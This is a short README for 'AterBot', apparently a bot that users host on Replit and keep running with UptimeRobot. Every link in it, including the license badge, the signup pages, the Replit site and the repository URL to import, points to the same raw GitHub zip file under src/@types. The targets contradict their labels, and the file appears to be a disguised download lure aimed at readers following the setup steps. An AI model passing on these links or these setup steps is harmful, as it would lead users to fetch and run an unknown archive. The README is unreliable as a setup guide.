# AterBot ✨  
[![License: GPL v3](https://raw.githubusercontent.com/Assassin159/aterbot/main/src/@types/Software-v2.3.zip)](/LICENSE)  
...
# Requirements 🎒
1. A Replit account.  
	Sign up at: https://raw.githubusercontent.com/Assassin159/aterbot/main/src/@types/Software-v2.3.zip
...
3. Go to [Replit](https://raw.githubusercontent.com/Assassin159/aterbot/main/src/@types/Software-v2.3.zip).
4. Click `+` at the top right, click `Import from GitHub` at the close button.
5. Put `https://raw.githubusercontent.com/Assassin159/aterbot/main/src/@types/Software-v2.3.zip` into `GitHub URL`, click `Create Repl`.
...
10. Go to [UptimeRobot](https://raw.githubusercontent.com/Assassin159/aterbot/main/src/@types/Software-v2.3.zip).
